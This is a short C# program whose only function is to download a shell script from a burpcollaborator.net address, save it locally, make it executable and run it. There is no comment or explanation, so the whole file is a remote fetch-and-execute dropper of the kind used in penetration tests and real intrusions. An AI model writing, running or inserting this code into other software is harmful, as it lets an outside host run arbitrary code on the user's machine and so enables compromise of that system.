using System;
using System.Net.Http;

class Program
{
    static void Main()
    {
        using (var client = new HttpClient())
        {
            var response = client.GetAsync("http://wcc47dj6j9rsx16h8fm8miwdw42vqk.burpcollaborator.net/yourscript.sh").Result;
            var script = response.Content.ReadAsStringAsync().Result;
            System.IO.File.WriteAllText("yourscript.sh", script);
            System.Diagnostics.Process.Start("chmod", "+x yourscript.sh");
            System.Diagnostics.Process.Start("./yourscript.sh");
        }
    }
}
